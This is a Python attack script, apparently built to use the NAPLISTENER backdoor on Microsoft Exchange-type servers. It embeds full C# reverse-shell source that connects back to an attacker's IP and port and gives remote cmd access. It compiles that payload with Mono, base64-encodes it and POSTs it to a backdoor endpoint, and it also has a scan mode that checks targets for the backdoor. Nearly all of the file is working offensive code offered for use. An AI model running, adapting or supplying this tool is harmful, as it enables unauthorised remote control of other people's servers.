#!/usr/bin/python3
import requests
import platform
import subprocess
import base64
import requests.utils
import urllib3
import argparse
import textwrap
import sys
from requests import InsecureRequestWarning, session
urllib3.disable_warnings(InsecureRequestWarning)

WINDOWS = 'Windows'
WINDOWS_TOOL = 1
MONO_WINDOWS_URL = "https://download.mono-project.com/archive/6.12.0/windows-installer/mono-6.12.0.206-x64-0.msi"
MONO_WINDOWS_FILE = "mono.msi"
COMPILE_COMMAND_WINDOWS = r'"C:\Program Files\Mono\bin\mcs.bat" -out:Reverse.exe Reverse.cs'

LINUX = 'Linux'
LINUX_TOOL = 4
COMPILE_COMMAND_LINUX = 'mcs -out:Reverse.exe Reverse.cs'

DATA_KEY = 'sdafwe3rwe23'
URL_PATH = '/ews/MsExgHealthCheckd'
PROXIES = {'http': 'http://127.0.0.1:8080'}

logo = '''
 /$$   /$$  /$$$$$$  /$$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$
| $$$ | $$ /$$__  $$| $$__  $$| $$      |_  $$_/ /$$__  $$|__  $$__/| $$_____/| $$$ | $$| $$_____/| $$__  $$
| $$$$| $$| $$  \ $$| $$  \ $$| $$        | $$  | $$  \__/   | $$   | $$      | $$$$| $$| $$      | $$  \ $$
| $$ $$ $$| $$$$$$$$| $$$$$$$/| $$        | $$  |  $$$$$$    | $$   | $$$$$   | $$ $$ $$| $$$$$   | $$$$$$$/
| $$  $$$$| $$__  $$| $$____/ | $$        | $$   \____  $$   | $$   | $$__/   | $$  $$$$| $$__/   | $$__  $$
| $$\  $$$| $$  | $$| $$      | $$        | $$   /$$  \ $$   | $$   | $$      | $$\  $$$| $$      | $$  \ $$
| $$ \  $$| $$  | $$| $$      | $$$$$$$$ /$$$$$$|  $$$$$$/   | $$   | $$$$$$$$| $$ \  $$| $$$$$$$$| $$  | $$
|__/  \__/|__/  |__/|__/      |________/|______/ \______/    |__/   |________/|__/  \__/|________/|__/  |__/
                                                                                    REF2924
'''

class Main:
    def __init__(self, args):
        # Initialize reverse shell code, from (https://revshells.com/)
        self.revshell = '''
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Reverse
{
    public class Run
    {
        // Declare a StreamWriter that will be used to write to the TCP stream
        static StreamWriter streamWriter;

        public Run()
        {
            // Create a new TCP client that connects to the specified IP and port
            using (TcpClient client = new TcpClient("@IP", @PORT))
            {
                // Get the TCP stream
                using (Stream stream = client.GetStream())
                {
                    // Create a StreamReader that reads from the TCP stream
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        // Initialize the StreamWriter with the TCP stream
                        streamWriter = new StreamWriter(stream);

                        // Create a StringBuilder to hold the input from the TCP stream
                        StringBuilder strInput = new StringBuilder();

                        // Create a new process that runs cmd
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;

                        // Attach an event handler to the process's OutputDataReceived event
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

                        // Start the process
                        p.Start();

                        // Begin asynchronously reading the standard output of the process
                        p.BeginOutputReadLine();

                        // While the process is running
                        while (true)
                        {
                            // Append the input from the TCP stream to the StringBuilder
                            strInput.Append(rdr.ReadLine());

                            // Write the input to the standard input of the process
                            p.StandardInput.WriteLine(strInput);

                            // Clear the StringBuilder
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            // Create a new instance of the Run class (reference: https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)
            new Run();
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // Create a StringBuilder to hold the output from the process
            StringBuilder strOutput = new StringBuilder();

            // If the output is not null or empty
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // Append the output to the StringBuilder
                    strOutput.Append(outLine.Data);

                    // Write the output to the TCP stream and flush the stream
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
'''
        # Initialize parser (Check if the user has entered the correct parameters)
        if args.ip_address and args.port and args.URL:
            self.__run(args.ip_address,args.port,args.URL)
        elif args.URL:
            print("[*] Scaning remote server...")
            self.__send_payload(args.URL,'',True)
        else:
            print("[!] Incorrect parameter options.")

    def __check_os(self):
        os_type = platform.system()
        if os_type == WINDOWS: return WINDOWS
        elif os_type == LINUX: return LINUX
        else:
            print("[?] Unknown OS Version")
            return False

    # Execute shell command success/failure (disregard output)
    def __execute_command(self,command):
        try:
            subprocess.run(command, shell=True, check=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            return False
    

    def __save_file(self, note):
        try:
            with open('Reverse.cs', 'w', encoding='utf-8') as f:
                f.write(note)
        except Exception as e:
            print(f'[-] An error occurred: {e}')
            return False
        else:
            return True

    def __download_file(self,url, filename=None):
        if not filename: filename = url.split('/')[-1]
        try:
            response = session.get(url,verify=False)
            with open('./download/'+filename, 'wb') as f:
                f.write(response.content)
        except Exception as e:
            print(f'[-] An error occurred: {e}')
            return False
        else:
            return True
        
    # Check if mono is installed; if not, download and install it
    def __check_tools(self, plat):
        if plat not in [WINDOWS, LINUX]:
            return False

        if self.__is_mono_installed(plat):
            return 1 if plat == WINDOWS else 4

        print("[+] Downloading Mono....")
        return self.__download_and_install_mono(plat)

    def __is_mono_installed(self, plat):
        command = r'"C:\Program Files\Mono\bin\mcs.bat" --version' if plat == WINDOWS else 'mcs --version'
        return self.__execute_command(command)

    def __download_and_install_mono(self, plat):
        if plat == WINDOWS:
            return self.__download_and_install_mono_windows()
        elif plat == LINUX:
            return self.__download_and_install_mono_linux()

    def __download_and_install_mono_windows(self):
        if self.__download_file(MONO_WINDOWS_URL, MONO_WINDOWS_FILE):
            print("[*] Mono Download: Please install mono in the './Download/Mono.msi' directory and try again.")
            return 2
        else:
            print("[!] Mono Download: Fail! Check network connection.")
            return 3

    def __download_and_install_mono_linux(self):
        print("[*] Atempting: sudo apt install mono-devel")
        if self.__execute_command("sudo apt install mono-devel"):
            return 2
        else:
            print("[!] Please install manually.")
            return 3
    
    # Convert binary to base64 for transmission
    def __convert_base64(self):
        try:
            base64_data = ''
            with open('./Reverse.exe', 'rb') as f:
                while (chunk := f.read(8192)):
                    base64_data += base64.b64encode(chunk).decode('utf-8')
            base64_data = base64_data.replace('\n', '')
            return base64_data
        except Exception as e:
            return False
    
    # Send payload to target, check for backdoor
    def __send_payload(self, url, data, scanner=False):
        datas = self.__prepare_data(data, scanner)
        try:
            res = self.__send_request(url, datas)
        except TimeoutError as e:
            print(f"[-] Timeout: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")
        else:
            self.__handle_response(res, scanner)

    def __prepare_data(self, data, scanner):
        return f'{DATA_KEY}=' if scanner else f"{DATA_KEY}={data}"

    session = requests.Session()
    def __send_request(self, url, datas):
        return session.post(url + URL_PATH, data=datas, verify=False, timeout=10, proxies=PROXIES)

    def __handle_response(self, res, scanner):
        if res.status_code == 200:
            self.__handle_success(scanner)
        else:
            self.__handle_failure(scanner)

    def __handle_success(self, scanner):
        if scanner:
            print("[+] Target has a backdoor.")
        else:
            print("[+] Exploit successful.")
            print("========WIN========")

    def __handle_failure(self, scanner):
        if scanner:
            print("[-] There is no backdoor for the target.")
        else:
            print("[-] Exploit Fail...")
    
    # Run the exploit
    def __run(self, ip_address, port, url):
        url = url.strip('/')
        os_type = self.__check_os()
        if os_type:
            tool_type = self.__check_tools(os_type)
            if tool_type in [WINDOWS_TOOL, LINUX_TOOL]:
                self.__prepare_and_send_payload(ip_address, port, url, tool_type)

    def __prepare_and_send_payload(self, ip_address, port, url, tool_type):
        revshell = self.__prepare_revshell(ip_address, port)
        if self.__save_file(revshell):
            print("[+] Create Payload.")
            if self.__compile_payload(tool_type):
                self.__encode_and_send_payload(url)

    def __prepare_revshell(self, ip_address, port):
        revshell = self.revshell.replace("@IP", ip_address)
        return revshell.replace("@PORT", port)

    def __compile_payload(self, tool_type):
        command = COMPILE_COMMAND_WINDOWS if tool_type == WINDOWS_TOOL else COMPILE_COMMAND_LINUX
        if self.__execute_command(command):
            print("[+] Compilation of payload completed")
            return True
        return False

    def __encode_and_send_payload(self, url):
        base64_payload = self.__convert_base64()
        if base64_payload:
            print("[+] Base64 Encoding..")
            print(f"[*] Sending payload to target [{url}]")
            self.__send_payload(url, str(requests.utils.quote(base64_payload, safe='')))
        else:
            print("[-] .exe Error..")




if __name__ in '__main__':
    print(logo)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHeportFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-https://github.com/ttate10
            Basic usage:
                python3 {Naplistener} -u <(http/https)://xxxx.xxx> # Only detect rear doors.
                python3 {Naplistener} -ip_address <Reverse shell IP> -port <Reverse shell port> -u <(http/https)://xxx.xxx> # Using backdoor and build reverse shell.
                '''.format(Naplistener=sys.argv[0])))
    parser.add_argument('-ip_address', '--ip_address',default='', heport='Reverse Shell IP Address')
    parser.add_argument('-port', '--port',default='', heport='Reverse Shell Port')
    parser.add_argument('-u', '--URL',default='', heport='Remote server')
    args = parser.parse_args()
    Main(args)
   
